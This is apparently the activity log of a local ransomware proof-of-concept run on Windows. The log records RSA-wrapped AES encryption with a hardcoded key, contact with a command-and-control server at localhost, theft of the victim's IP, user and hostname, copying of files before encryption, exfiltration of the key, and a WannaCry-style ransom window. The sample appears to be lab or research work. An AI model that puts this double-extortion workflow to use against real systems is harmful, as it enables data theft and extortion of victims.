2025-06-25 12:31:15,047 - INFO - ============================================================
2025-06-25 12:31:15,048 - INFO - RANSOMWARE PoC ACTIVITY LOG STARTED
2025-06-25 12:31:15,048 - INFO - ============================================================
2025-06-25 12:31:15,049 - INFO - Log file: logs/ransomware_activity_20250625_123115.log
2025-06-25 12:31:15,049 - INFO - Timestamp: 2025-06-25 12:31:15
2025-06-25 12:31:15,191 - INFO - Platform: Windows 11
2025-06-25 12:31:15,192 - INFO - Python version: 3.13.5 (tags/v3.13.5:6cb20a2, Jun 11 2025, 16:15:46) [MSC v.1943 64 bit (AMD64)]
2025-06-25 12:31:15,192 - INFO - User: mudit
2025-06-25 12:31:15,193 - INFO - Hostname: Mudityadev
2025-06-25 12:31:15,194 - INFO - ============================================================
2025-06-25 12:31:15,194 - INFO - Starting main function
2025-06-25 12:31:15,195 - INFO - Parsing command line arguments
2025-06-25 12:31:15,195 - INFO - Setting up argument parser
2025-06-25 12:31:15,197 - INFO - Parsing command line arguments
2025-06-25 12:31:15,197 - INFO - Arguments parsed - Path: D:\AI-Agent\Ransomware-PoC\testDir, Encrypt: True, Decrypt: False
2025-06-25 12:31:15,197 - INFO - Operation mode: ENCRYPT
2025-06-25 12:31:15,198 - INFO - Target path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:31:15,198 - INFO - Using specified path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:31:15,198 - INFO - Initializing RSA encryption for AES key
2025-06-25 12:31:15,268 - INFO - AES key encrypted with RSA public key
2025-06-25 12:31:15,268 - INFO - Encrypted key (base64): fz8gsI8zWUXdfr4W/MZhrUQ+ZSIOEbFf5OJwEk1W1BlWtvQpXVhtWfG3js6Ddfy9FEE2uvxFWUDksvimySsG9GjPVlN2w8SnnRs7YUthRuY39cRXYLW++jBG6QRFuVmULiWh39fVZELVVCtYJDB8WH80DtTHkJX2r9OAuXeplh0OqUicIt5WZw7Nz6shOjWVjnCpitqBiLP6/guldCKty7YTr5Nk1VOCdkbHGOURDZyErZ3JWeeOQ43wzlaMcVV9PVE1OKEu7Nxn5P+3oI11xwSNc+FLLEB0DNDjzmy4cZUB+p1wCMVY9i//z2lcKEPQkKwq53HYPsnemu0UthcREA==
2025-06-25 12:31:15,269 - INFO - Using hardcoded AES key for encryption
2025-06-25 12:31:15,269 - INFO - Creating AES cipher with CTR mode
2025-06-25 12:31:15,278 - INFO - Starting file discovery and processing
2025-06-25 12:31:15,279 - INFO - Connecting to C2 server BEFORE encryption to copy clean files
2025-06-25 12:31:15,279 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 12:31:15,304 - INFO - Retrieving local IP address
2025-06-25 12:31:15,306 - INFO - Local IP address: 192.168.217.136
2025-06-25 12:31:15,307 - INFO - Successfully sent target directory to C2 server: 127.0.0.1:8080
2025-06-25 12:31:15,308 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:31:15,308 - INFO - C2 server will now copy clean files before encryption begins
2025-06-25 12:31:15,308 - INFO - Waiting for C2 server to complete file exfiltration...
2025-06-25 12:31:17,309 - INFO - Proceeding with file encryption...
2025-06-25 12:31:17,309 - INFO - Processing directory: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:31:17,311 - INFO - Discovered 0 files in D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:31:17,311 - INFO - Total files processed: 0
2025-06-25 12:31:17,312 - INFO - Starting key exfiltration and GUI launch
2025-06-25 12:31:17,312 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 12:31:17,331 - INFO - Retrieving local IP address
2025-06-25 12:31:17,332 - INFO - Local IP address: 192.168.217.136
2025-06-25 12:31:17,333 - INFO - Successfully sent data to C2 server: 127.0.0.1:8080
2025-06-25 12:31:17,334 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:31:17,334 - INFO - Launching WannaCry-style GUI window
2025-06-25 12:31:23,617 - INFO - Received keyboard interrupt, exiting
